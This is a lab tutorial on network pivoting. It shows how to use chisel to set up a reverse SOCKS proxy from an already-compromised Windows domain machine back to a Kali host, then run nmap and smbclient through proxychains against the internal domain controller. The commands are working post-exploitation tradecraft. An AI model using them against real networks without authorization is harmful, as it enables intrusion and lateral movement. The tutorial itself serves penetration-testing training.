In this tutorial, we are covering a scenario where we have network access a to single Windows domain-joined system (**Client A**) from our Kali machine. **Client A** has two network interfaces, the one on which our Kali machine has access, and the second one facing an internal network, where the rest of the domain-joined systems reside, including the domain controller. We do not have direct access to this internal network from Kali. Our goal is therefore to use **Client A** as a pivot point into the the internal network, allowing us to perform **Nmap** scans and other actions against all the systems in the domain.

To achieve this, we will be using the tool [chisel](https://github.com/jpillora/chisel).

## What is Chisel? A brief overview

Chisel can set up TCP/UDP tunnels over HTTP, and secures them using SSH. The chisel binary includes both the server and client, with versions available for both Linux and Windows which can interact. According to the chisel [github](https://github.com/jpillora/chisel) page:

> Chisel is mainly useful for passing through firewalls, though it can also be used to provide a secure endpoint into your network.

## Scenario

Here I will explain our setup in a little more detail:

![ad-domain](/assets/img/chisel/domain.png)

All machines in the example are running on VMWare Workstation. We have a small Active Directory domain, comprised of three machines. A domain controller (Windows server 2019) and two Windows client machines (Windows 10 Enterprise). We also have our 'attacker' machine, running Kali Linux, outside the domain. All machines in the domain are on the same __host-only__ network, `10.10.10.0/24`. However, **Client A** has two network interfaces, the second of which is on the `192.168.136.0/24` __host-only__ network, where our Kali system also resides. From our Kali system, we can therefore ping, scan, and potentially exploit **Client A**. It is our pivot point into the domain. 

For this tutorial, we will assume that we have already exploited and gained a SYSTEM level shell on **Client A**. Our goal here is simply to gain the ability to scan the other machines on the internal `10.10.10.0/24` network, to which we have no direct access from Kali.

In order to do this, we have already transferred [chisel.exe](https://github.com/jpillora/chisel/releases) to **Client A** (see my [File Transfer](https://dev-0x0/github.io/tags/file-transfer/) tutorials), which we will use to set up a **reverse SOCKS proxy**, allowing us to **Nmap** scan the internal network machines (**Client B** and the **Domain Controller**) through the **proxychains** tool on Kali.

If all this seems confusing, fear not, we will take it step by step, and I will try to keep things concise from here!

## What we need to do

1. Open `/etc/proxychains4.conf` on Kali and make an entry for a SOCKS5 proxy.
2. On Kali, start our **chisel** reverse proxy server.
3. On **Client A**, connect the **chisel** client back to the server.
4. Use the proxy by sending our tools (**Nmap** etc.) through **proxychains**.

## Prerequisites

1. Install **chisel** on Kali Linux, if not already installed ([installation](https://github.com/jpillora/chisel#install))
2. Get the **chisel** Windows binary ([available here](https://github.com/jpillora/chisel/releases)). The download has a name like `chisel_1.7.7_windows_amd64.gz`. I have renamed the actual binary to *chisel.exe* for convenience.
3. A lab setup to practice on. As mentioned above, I am working on a tutorial for this.

## Step 1: Editing /etc/proxychains4.conf

According to the [proxychains](https://github.com/haad/proxychains) github page:

> ProxyChains is a UNIX program, that hooks network-related libc functions in dynamically linked programs via a preloaded DLL and redirects the connections through SOCKS4a/5 or HTTP proxies.

Great. We use the `proxychains4.conf` file to tell it about our proxy, then we can run tools through the proxy with a command like:

`sudo proxychains [COMMMAND]`

We use the following entry, which we put in the **[ProxyList]** section at the end of the file. 

**Important**: We should make sure our proxy entry is the only uncommented proxy here. Depending on other settings in the file, we may run into issues otherwise.

SOCKS5 proxy entry:

`sudo vim /etc/proxychains4.conf`

> socks5 127.0.0.1 1080

![proxychains.conf](/assets/img/chisel/proxychains-conf.png)


## Step 2: Starting up Chisel 

![chisel-server](/assets/img/chisel/chisel-server.png)

![chisel-client](/assets/img/chisel/chisel-client.png)

**Commands:**

On Kali (do this first). We start our **chisel server** on port **8000**.

`chisel server --port 8000 --reverse`

On Windows (Client A). We start the **chisel client**, specify the server to connect back to (on Kali), and specify our SOCKS proxy, configured in `proxychains4.conf`.

`chisel.exe client 192.168.136.129:8000 R:1080:socks`

Some **chisel** help:

**chisel server**

![port-help](/assets/img/chisel/port-help.png)
![reverse-help](/assets/img/chisel/reverse-help.png)

**chisel client**

We connect back to our **chisel** server on Kali at `192.168.136.129:8000`, and create the reverse (`R`) SOCKS5 proxy
on port `1080`. Traffic sent through **proxychains** will now be proxied through the client.

On Kali, we can see that port 1080 is now listening on 127.0.0.1

![socks-port](/assets/img/chisel/socks-port.png)

## Step 3: Scanning the internal network

To scan the internal network, we must, as mentioned above, use **proxychains**, so that all our traffic traverses through the proxy. This brings us to an important caveat.

When using **Nmap** through **proxychains** we are restricted to using the less efficient (much slower) **Connect()** scan, which utilises TCP connections (`-sT` option). We must also use the `-Pn` option, which tells **Nmap** to skip host discovery (no ping). For this reason, it is often more practical to use the `--top-ports` **Nmap** option for initial scans, rather than scanning the entire port range.

Since I know the IP addresses of the systems on the internal network, below is a port scan of the **Domain Controller**. 

**Nmap command with proxychains:**

`sudo proxychains -q nmap -Pn -sT --top-ports 100 --open -T4 10.10.10.128`

The `-q` option stops **proxychains** from outputting all the connections it is making behind the scenes.
Leaving this out can be useful for debugging purposes.

## Other commands through proxychains

We can also use other tools through proxychains like **smbclient** shown below, and scripts like **enum4linux-ng.py**.

![smbclient-proxychains](/assets/img/chisel/smbclient-proxychains.png)

## Conclusion

We can now use **Nmap**, and other tools and scripts against the machines in the internal network. In a future tutorial, I will cover setting up port-forwarding with **plink.exe** in order to transfer files from our Kali system to machines in the internal network. I hope this was helpful.
